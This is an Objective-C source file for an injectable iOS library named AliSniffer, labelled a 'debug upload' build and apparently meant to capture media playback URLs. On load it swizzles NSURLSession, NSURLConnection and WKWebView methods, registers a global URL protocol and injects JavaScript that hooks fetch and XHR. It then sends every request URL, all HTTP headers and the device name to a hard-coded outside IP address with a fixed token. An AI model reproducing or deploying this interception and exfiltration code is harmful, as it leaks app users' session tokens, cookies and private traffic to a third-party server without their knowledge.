
//
//  AliSniffer_debug_upload_safe.m
//  Safe debug upload build (no UI prompts) — same aggressive hooks but avoids presenting UIAlertController
//  Use this if the previous debug upload caused immediate crashes when the alert tried to present.
//
//  IMPORTANT: change kLogUploadEndpoint/kLogUploadToken to your server before injection.
//


#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

#define LOG(...) NSLog(__VA_ARGS__)

// ---------- Upload endpoint (change to your server) ----------
static NSString * const kLogUploadEndpoint = @"http://139.155.57.242:8088/api/push_raw";
static NSString * const kLogUploadToken    = @"@Yy166431"; // optional

// ---------- Upload utility ----------
static void UploadLogLineAsync(NSString *note, NSString *url, NSDictionary *headers) {
    if (!url) url = @"";
    NSMutableDictionary *payload = [NSMutableDictionary dictionary];
    payload[@"note"] = note ?: @"";
    payload[@"url"] = url ?: @"";
    payload[@"time"] = @([[NSDate date] timeIntervalSince1970]);
    if (headers && headers.count) payload[@"headers"] = headers;
    payload[@"device"] = @{
        @"name": UIDevice.currentDevice.name ?: @"",
        @"model": UIDevice.currentDevice.model ?: @"",
        @"sys": UIDevice.currentDevice.systemVersion ?: @""
    };
    NSData *d = nil;
    @try { d = [NSJSONSerialization dataWithJSONObject:payload options:0 error:NULL]; } @catch(...) { d = nil; }
    if (!d) return;
    NSURL *u = [NSURL URLWithString:kLogUploadEndpoint];
    if (!u) return;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u];
    req.HTTPMethod = @"POST";
    [req setValue:kLogUploadToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = d;
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.timeoutIntervalForRequest = 8.0;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg];
    NSURLSessionDataTask *t = [s dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable resp, NSError * _Nullable err) {
        if (err) {
            LOG(@"[AliSniffer][UPLOAD] failed to upload: %@", err);
        } else {
            LOG(@"[AliSniffer][UPLOAD] uploaded log note=%@ url=%@", note, url);
        }
    }];
    [t resume];
}

// ---------- Debug report (console + upload + clipboard attempt safe) ----------
static void DebugReportAndUpload(NSString *url, NSDictionary *hdrs, NSString *note) {
    if (!url) url = @"";
    @try { LOG(@"[AliSniffer][REPORT] note=%@ url=%@ headers=%@", note ?: @"", url, hdrs ?: @{}); } @catch(...) {}
    // try to copy to clipboard safely on main thread, but ignore failures
    dispatch_async(dispatch_get_main_queue(), ^{
        @try {
            [UIPasteboard generalPasteboard].string = url;
        } @catch(...) {}
    });
    // upload asynchronously
    UploadLogLineAsync(note ?: @"debug", url, hdrs ?: @{} );
}

// ---------- Hooks ----------
// resume hook
static void (*g_orig_resume)(id, SEL) = NULL;
static void swz_resume_debug(id self, SEL _cmd) {
    @try {
        id req = nil;
        if ([self respondsToSelector:@selector(currentRequest)]) {
            req = [self performSelector:@selector(currentRequest)];
        } else if ([self respondsToSelector:@selector(originalRequest)]) {
            req = [self performSelector:@selector(originalRequest)];
        }
        if (req && [req respondsToSelector:@selector(URL)]) {
            NSURLRequest *r = req;
            DebugReportAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"resume_hook");
        } else {
            DebugReportAndUpload(@"(no request)", @{}, @"resume_hook_no_req");
        }
    } @catch (NSException *e) {
        LOG(@"[AliSniffer][ERR] resume hook exception: %@", e);
    }
    if (g_orig_resume) g_orig_resume(self, _cmd);
}

// dataTaskWithRequest
static id (*g_orig_dataTaskWithRequest)(id, SEL, NSURLRequest *) = NULL;
static id swz_dataTaskWithRequest_debug(id self, SEL _cmd, NSURLRequest *req) {
    @try {
        if (req && req.URL) {
            DebugReportAndUpload(req.URL.absoluteString, req.allHTTPHeaderFields ?: @{}, @"dataTaskWithRequest");
        } else {
            DebugReportAndUpload(@"(no url)", @{}, @"dataTaskWithRequest");
        }
    } @catch (NSException *e) {
        LOG(@"[AliSniffer][ERR] dataTaskWithRequest exception: %@", e);
    }
    if (g_orig_dataTaskWithRequest) return g_orig_dataTaskWithRequest(self, _cmd, req);
    return nil;
}

// dataTaskWithURL
static id (*g_orig_dataTaskWithURL)(id, SEL, NSURL *) = NULL;
static id swz_dataTaskWithURL_debug(id self, SEL _cmd, NSURL *u) {
    @try {
        if (u) DebugReportAndUpload(u.absoluteString, @{}, @"dataTaskWithURL");
    } @catch (NSException *e) { LOG(@"[AliSniffer][ERR] dataTaskWithURL exception: %@", e); }
    if (g_orig_dataTaskWithURL) return g_orig_dataTaskWithURL(self, _cmd, u);
    return nil;
}

// NSURLConnection sendAsynchronousRequest:queue:completionHandler:
static void (*g_orig_sendAsync)(Class, SEL, NSURLRequest*, NSOperationQueue*, void(^)(NSURLResponse*, NSData*, NSError*)) = NULL;
static void swz_sendAsync_debug(Class self, SEL _cmd, NSURLRequest *req, NSOperationQueue *q, void(^handler)(NSURLResponse*, NSData*, NSError*)) {
    @try {
        DebugReportAndUpload(req.URL.absoluteString, req.allHTTPHeaderFields ?: @{}, @"NSURLConnection_sendAsync");
    } @catch (NSException *e) { LOG(@"[AliSniffer][ERR] sendAsync exception: %@", e); }
    if (g_orig_sendAsync) g_orig_sendAsync(self, _cmd, req, q, handler);
}

// NSURLProtocol simple implementation to be registered globally
@interface _DebugProtoUploadSafe : NSURLProtocol <NSURLSessionDataDelegate>
@property(nonatomic,strong) NSURLSessionDataTask *task;
@end
@implementation _DebugProtoUploadSafe
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    if ([NSURLProtocol propertyForKey:@"_alisniffer_debug" inRequest:request]) return NO;
    NSString *s = request.URL.scheme.lowercaseString ?: @"";
    if ([s isEqualToString:@"http"] || [s isEqualToString:@"https"]) return YES;
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }
- (void)startLoading {
    NSMutableURLRequest *r = [self.request mutableCopy];
    @try { [NSURLProtocol setProperty:@YES forKey:@"_alisniffer_debug" inRequest:r]; } @catch(...) {}
    @try { DebugReportAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"NSURLProtocol_start"); } @catch(...) {}
    NSURLSession *s = [NSURLSession sessionWithConfiguration:NSURLSessionConfiguration.defaultSessionConfiguration delegate:self delegateQueue:nil];
    self.task = [s dataTaskWithRequest:r];
    [self.task resume];
}
- (void)stopLoading { [self.task cancel]; self.task = nil; }
- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
    // no-op
}
- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) [self.client URLProtocol:self didFailWithError:error];
    else [self.client URLProtocolDidFinishLoading:self];
}
@end

// WK injection: simple script to post fetch/XHR URLs via message handler
static id (*g_orig_wkinit)(id, SEL, CGRect, id) = NULL;
static id swz_wkinit_upload_safe(id self, SEL _cmd, CGRect frame, id cfg) {
    if (cfg) {
        @try {
            id ucc = [cfg valueForKey:@"userContentController"];
            if (ucc) {
                NSString *js = @"(function(){function p(u){try{window.webkit.messageHandlers._dbg.postMessage(JSON.stringify({type:'fetch_url',url:u}));}catch(e){}};var f=window.fetch; if(f){window.fetch=function(){var u=arguments[0]; if(typeof u==='string') p(u); return f.apply(this,arguments);};} var X=window.XMLHttpRequest; if(X){var o=X.prototype.open; X.prototype.open=function(m,u){try{p(u);}catch(e){} return o.apply(this,arguments);} }})();";
                id wkuser = ucc;
                if ([wkuser respondsToSelector:@selector(addUserScript:)]) {
                    Class WKUserScriptClass = NSClassFromString(@"WKUserScript");
                    id script = [[WKUserScriptClass alloc] initWithSource:js injectionTime:0 forMainFrameOnly:NO];
                    // call addUserScript safely
                    SEL addSel = sel_registerName("addUserScript:");
                    if ([wkuser respondsToSelector:addSel]) {
                        ((void(*)(id,SEL,id))objc_msgSend)(wkuser, addSel, script);
                    }
                }
                // We will not try to attach handler to existing configs here to avoid unsafe window traversal
            }
        } @catch(...) {}
    }
    if (g_orig_wkinit) return g_orig_wkinit(self, _cmd, frame, cfg);
    return nil;
}

// Lightweight WKScriptMessageHandler implementation
@interface _UploadWKHandlerSafe : NSObject <WKScriptMessageHandler>
@end
@implementation _UploadWKHandlerSafe
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if (!message.body) return;
    @try {
        NSString *s = [message.body description];
        NSData *d = [s dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *j = nil;
        @try { j = [NSJSONSerialization JSONObjectWithData:d options:0 error:NULL]; } @catch(...) { j = nil; }
        if (j && j[@"type"] && [j[@"type"] isEqualToString:@"fetch_url"]) {
            NSString *u = j[@"url"] ?: @"";
            if (u.length) DebugReportAndUpload(u, @{ }, @"WK_fetch_url");
        } else {
            DebugReportAndUpload(s, @{ }, @"WK_msg");
        }
    } @catch(...) {}
}
@end

// Constructor: install hooks and register protocol; avoids UI and unsafe iterations
__attribute__((constructor))
static void _alisniffer_debug_upload_safe_init(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            LOG(@"[AliSniffer] debug upload safe init start");

            // Hook resume on likely classes
            NSArray *candidates = @[@"__NSCFURLSessionTask", @"__NSURLSessionLocalTask", @"NSURLSessionTask"];
            BOOL hooked = NO;
            for (NSString *n in candidates) {
                Class c = NSClassFromString(n);
                if (!c) continue;
                SEL sel = @selector(resume);
                Method m = class_getInstanceMethod(c, sel);
                if (!m) continue;
                IMP orig = method_getImplementation(m);
                if (orig) {
                    g_orig_resume = (void *)orig;
                    method_setImplementation(m, (IMP)swz_resume_debug);
                    LOG(@"[AliSniffer] hooked resume on %@", n);
                    hooked = YES;
                    break;
                }
            }
            if (!hooked) LOG(@"[AliSniffer] couldn't hook resume candidates");

            // Hook NSURLSession dataTaskWithRequest: & dataTaskWithURL:
            Class NSURLSessionClass = NSClassFromString(@"NSURLSession");
            if (NSURLSessionClass) {
                SEL sel = @selector(dataTaskWithRequest:);
                Method m = class_getInstanceMethod(NSURLSessionClass, sel);
                if (m) {
                    g_orig_dataTaskWithRequest = (void *)method_getImplementation(m);
                    method_setImplementation(m, (IMP)swz_dataTaskWithRequest_debug);
                    LOG(@"[AliSniffer] hooked NSURLSession dataTaskWithRequest:");
                }
                SEL sel2 = @selector(dataTaskWithURL:);
                Method m2 = class_getInstanceMethod(NSURLSessionClass, sel2);
                if (m2) {
                    g_orig_dataTaskWithURL = (void *)method_getImplementation(m2);
                    method_setImplementation(m2, (IMP)swz_dataTaskWithURL_debug);
                    LOG(@"[AliSniffer] hooked NSURLSession dataTaskWithURL:");
                }
            } else {
                LOG(@"[AliSniffer] NSURLSession class not found");
            }

            // NSURLConnection sendAsynchronousRequest:
            Class NSURLConnectionClass = NSClassFromString(@"NSURLConnection");
            if (NSURLConnectionClass) {
                SEL sel = @selector(sendAsynchronousRequest:queue:completionHandler:);
                Method m = class_getClassMethod(NSURLConnectionClass, sel);
                if (m) {
                    g_orig_sendAsync = (void *)method_getImplementation(m);
                    method_setImplementation(m, (IMP)swz_sendAsync_debug);
                    LOG(@"[AliSniffer] hooked NSURLConnection sendAsynchronousRequest:");
                } else {
                    LOG(@"[AliSniffer] NSURLConnection sendAsynchronousRequest: not found");
                }
            }

            // Register NSURLProtocol
            @try {
                [NSURLProtocol registerClass:[_DebugProtoUploadSafe class]];
                LOG(@"[AliSniffer] registered _DebugProtoUploadSafe");
            } @catch (NSException *e) { LOG(@"[AliSniffer] registerClass exception: %@", e); }

            // WKWebView init swizzle
            Class WK = NSClassFromString(@"WKWebView");
            if (WK) {
                Method m = class_getInstanceMethod(WK, @selector(initWithFrame:configuration:));
                if (m) {
                    g_orig_wkinit = (void *)method_getImplementation(m);
                    method_setImplementation(m, (IMP)swz_wkinit_upload_safe);
                    LOG(@"[AliSniffer] hooked WKWebView initWithFrame:configuration:");
                }
            }

            LOG(@"[AliSniffer] debug upload safe init done. Reproduce playback now.");
        });
    }
}
